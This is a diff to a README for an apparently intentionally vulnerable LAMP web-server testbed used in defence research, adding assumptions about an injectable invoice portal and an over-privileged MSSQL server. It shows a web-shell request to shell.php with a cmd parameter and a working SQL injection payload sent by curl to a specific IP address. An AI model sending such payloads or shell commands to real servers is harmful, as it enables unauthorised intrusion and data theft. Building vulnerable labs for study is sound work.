@@ -1,5 +1,18 @@
 # Web Server
 
+## Requirements
+
+For example, the exemplar assumes SQL injection is possible on the vendor web portal, **the web application where the contractor can submit invoices to the enterprise**. Additionally, the exemplar assumes a misconfiguration of the SQL server; in this example, **the SQL server is a Microsoft SQL server running with administrator privileges and has PowerShell enabled, allowing for command line interaction with the server.** The SQL injection will have a different level of observability and different set of defense tactics than network reconnaissance. This enables researchers to explore strategies such as focusing defensive tactics on increasing attack observability.
+
+### To-Do List
+
+- [X] test new sql file
+- [X] set password in the insertion of data
+- [X] test display
+- [X] test sql injection
+- [ ] automate sql injection
+- [ ] all done!
+
 ### LAMP
 
 - Linux
@@ -35,8 +48,12 @@ $ curl -X GET  http://IP_address/images/shell.php\?cmd\=uname
 
 #### 2. SQL Injection 
 
+
+
+
 ```shell
-$ curl -X GET  http://52.37.128.197/search.php\?query\=a 
+input query string: `anything%' OR 'x' LIKE '%x`
+$ curl -X GET  http://52.37.128.197/index.php?query=anything%25%27+OR+%27x%27+LIKE+%27%25x
 ```
 
 
